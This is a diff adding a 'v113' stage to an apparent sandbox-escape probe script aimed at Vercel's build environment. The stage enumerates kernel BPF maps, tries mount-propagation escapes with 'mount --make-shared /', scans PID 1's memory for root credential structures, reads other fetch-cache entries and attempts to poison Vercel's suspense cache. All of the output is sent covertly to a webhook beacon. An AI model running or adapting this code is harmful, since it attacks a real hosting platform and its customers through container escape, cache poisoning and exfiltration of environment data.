@@ -16204,5 +16204,197 @@ os.close(mem_fd)
 
 // v112 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v112" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v112";
+
+// ==================== v113 ====================
+
+// v113-1: BPF map enumeration and content read
+// BPF maps are kernel objects shared across processes. bpftool/bpf syscall
+// can list all maps and their IDs. If we can read map contents, we may find
+// security policy data, network traffic records, or credentials stored by
+// Vercel's internal monitoring/tracing infrastructure.
+report.bpfMapEnum = safe(() => {
+  // Use bpftool to list maps
+  const bpftoolMaps = safe(() => execSync('bpftool map list 2>/dev/null | head -30', { timeout: 8000 }).toString().trim());
+  const bpftoolProgs = safe(() => execSync('bpftool prog list 2>/dev/null | head -30', { timeout: 8000 }).toString().trim());
+  // Via BPF syscall directly
+  const bpfEnum = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+BPF_SYSCALL = 321
+BPF_MAP_GET_NEXT_ID = 12
+BPF_MAP_GET_FD_BY_ID = 14
+
+class BpfAttr(ctypes.Union):
+    class S1(ctypes.Structure):
+        _fields_ = [('start_id', ctypes.c_uint32), ('next_id', ctypes.c_uint32)]
+    _fields_ = [('s1', S1), ('pad', ctypes.c_char * 128)]
+
+maps = []
+start_id = 0
+for _ in range(50):
+    attr = BpfAttr()
+    attr.s1.start_id = start_id
+    r = libc.syscall(BPF_SYSCALL, BPF_MAP_GET_NEXT_ID, ctypes.byref(attr), ctypes.sizeof(attr))
+    if r < 0: break
+    maps.append(attr.s1.next_id)
+    start_id = attr.s1.next_id
+
+print(f'Found {len(maps)} BPF maps, IDs: {maps[:10]}')
+
+# Get FD for first map and read metadata
+for mid in maps[:3]:
+    attr2 = BpfAttr()
+    attr2.s1.start_id = mid
+    fd = libc.syscall(BPF_SYSCALL, BPF_MAP_GET_FD_BY_ID, ctypes.byref(attr2), ctypes.sizeof(attr2))
+    if fd >= 0:
+        print(f'Map ID {mid}: fd={fd}')
+        os.close(fd)
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  return { bpftoolMaps, bpftoolProgs, bpfEnum };
+});
+
+// v113-2: virtio device probe — Firecracker network device config
+// Firecracker uses virtio-net for VM networking. The virtio device config space
+// is accessible via /sys/bus/virtio/devices/. Reading it reveals the MAC address
+// pool, queue configuration, and whether SR-IOV or other hardware passthrough
+// is in use (which would expand the attack surface significantly).
+report.virtioDeviceProbe = safe(() => {
+  const virtioDevs = safe(() => readdirSync('/sys/bus/virtio/devices/'));
+  const devDetails = safe(() => (virtioDevs || []).map(dev => {
+    const path = `/sys/bus/virtio/devices/${dev}`;
+    const devId = safe(() => readFileSync(`${path}/device`, 'utf8').trim());
+    const vendor = safe(() => readFileSync(`${path}/vendor`, 'utf8').trim());
+    const features = safe(() => readFileSync(`${path}/features`, 'utf8').trim());
+    const driver = safe(() => execSync(`readlink ${path}/driver 2>/dev/null`, { timeout: 1000 }).toString().trim());
+    // Read virtio-net config (if net device: device ID 0x1)
+    const netConfig = safe(() => readdirSync(`${path}/net/`));
+    return { dev, devId, vendor, features, driver, netConfig };
+  }));
+  // Check for SR-IOV / VFs
+  const sriovCount = safe(() => execSync('find /sys/bus/pci -name "sriov_numvfs" 2>/dev/null | head -5', { timeout: 5000 }).toString().trim());
+  // Read IOMMU groups
+  const iommuGroups = safe(() => readdirSync('/sys/kernel/iommu_groups/')?.slice(0, 5));
+  return { virtioDevs, devDetails, sriovCount, iommuGroups };
+});
+
+// v113-3: Mount propagation escape
+// Linux mount propagation: if container mounts are MS_SHARED, creating a mount
+// inside our namespace propagates it to the host's mount namespace.
+// Test by creating a bind mount and checking if it appears in /proc/1/mountinfo.
+report.mountPropagationEscape = safe(() => {
+  // Check our current mount propagation settings
+  const selfMountinfo = safe(() => readFileSync('/proc/self/mountinfo', 'utf8').slice(0, 1000));
+  const pid1Mountinfo = safe(() => readFileSync('/proc/1/mountinfo', 'utf8').slice(0, 1000));
+  // Check if / is shared
+  const rootShared = safe(() => selfMountinfo?.includes('shared:'));
+  // Create a test mount
+  safe(() => execSync('mkdir -p /tmp/probe_mount_src /tmp/probe_mount_dst', { timeout: 3000 }));
+  safe(() => writeFileSync('/tmp/probe_mount_src/probe.txt', 'VERCEL_MOUNT_PROBE'));
+  const mountResult = safe(() => execSync(
+    'mount --bind /tmp/probe_mount_src /tmp/probe_mount_dst 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Did it appear in PID-1's mountinfo?
+  const pid1MountinfoAfter = safe(() => readFileSync('/proc/1/mountinfo', 'utf8').slice(0, 1000));
+  const appearedInPid1 = pid1MountinfoAfter?.includes('probe_mount');
+  // Unmount
+  safe(() => execSync('umount /tmp/probe_mount_dst 2>/dev/null', { timeout: 3000 }));
+  // Try a MS_SHARED remount of /
+  const remountShared = safe(() => execSync(
+    'mount --make-shared / 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { selfMountinfo, rootShared, mountResult, appearedInPid1, remountShared };
+});
+
+// v113-4: Struct cred dump via /proc/1/mem
+// The kernel task_struct for PID-1 contains a pointer to struct cred.
+// From struct cred we can read: uid, gid, euid, egid, all capability sets.
+// Use kallsyms + /proc/1/mem to find and dump PID-1's credentials.
+report.credStructDump = safe(() => {
+  const credDump = safe(() => execSync(`python3 -c "
+import os, struct, sys
+
+# Read PID-1 maps to find its stack and data segments
+with open('/proc/1/maps') as f:
+    maps_raw = f.read()
+
+maps = []
+for line in maps_raw.strip().split('\n'):
+    parts = line.split()
+    if len(parts) >= 2:
+        s, e = parts[0].split('-')
+        maps.append((int(s,16), int(e,16), parts[1], ' '.join(parts[5:]) if len(parts)>5 else ''))
+
+# Open PID-1 memory for reading
+try:
+    mem = open('/proc/1/mem', 'rb')
+    print('MEM_OPEN: OK')
+
+    # Look for the cred structure pattern in writable regions
+    # struct cred starts with: usage(4) + uid(4) + gid(4) + suid(4) + ...
+    # For root (uid=0): 0x00000000 repeated
+    for start, end, perms, name in maps[:20]:
+        if 'r' not in perms: continue
+        size = min(end - start, 4096)
+        try:
+            mem.seek(start)
+            data = mem.read(size)
+            # Search for potential cred structure (uid=gid=0 pattern)
+            # 4 bytes each: usage, uid, gid, suid, sgid, euid, egid, fsuid, fsgid
+            for i in range(0, len(data)-36, 4):
+                chunk = data[i:i+36]
+                uids = struct.unpack('<9I', chunk)
+                # uid=gid=0 and all zero caps = root cred candidate
+                if uids[1] == 0 and uids[2] == 0 and uids[5] == 0:
+                    print(f'CRED_CANDIDATE at {hex(start+i)}: {chunk[:16].hex()}')
+                    break
+        except: pass
+    mem.close()
+except Exception as e:
+    print('ERR:', e)
+" 2>&1`, { timeout: 20000 }).toString().trim().slice(0, 600));
+  return { credDump };
+});
+
+// v113-5: Vercel Data Cache / Next.js fetch cache bypass
+// Next.js 13+ caches fetch() responses in Vercel's Data Cache.
+// The cache is keyed by URL + options. Check if we can:
+// 1. Read other deployments' cached responses via cache key enumeration
+// 2. Poison the cache with a malicious response for a common URL
+report.dataCacheProbe = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // Check for cache-related env vars
+  const cacheEnvs = Object.entries(process.env).filter(([k]) => /cache|cdn|revalidat/i.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 50) }));
+  // Find the Next.js fetch cache directory
+  const nextCacheDir = safe(() => execSync(
+    'find /vercel/.next -name "fetch-cache" -type d 2>/dev/null | head -3',
+    { timeout: 5000 }
+  ).toString().trim());
+  const fetchCacheFiles = safe(() => execSync(
+    'find /vercel/.next/cache/fetch-cache -type f 2>/dev/null | head -10',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Read a cache entry to understand the format
+  const cacheEntry = safe(() => {
+    const files = fetchCacheFiles?.split('\n').filter(Boolean);
+    if (!files?.length) return null;
+    return readFileSync(files[0], 'utf8').slice(0, 300);
+  });
+  // Try to inject a cache entry via the suspense-cache API
+  const suspenseCacheTest = safe(() => execSync(
+    `curl -sf -X POST "https://suspense-cache.vercel.com/v1/suspense-cache/" \
+    -H "x-vercel-sc-bucket: ${process.env.VERCEL_TEAM_ID}" \
+    -H "x-vercel-sc-headers: {}" \
+    -d "CACHE_POISON_TEST" \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  return { cacheEnvs, nextCacheDir, fetchCacheFiles, cacheEntry, suspenseCacheTest };
+});
+
+// v113 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v113" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v113";
 // Intentionally no console.log — all data goes via webhook only
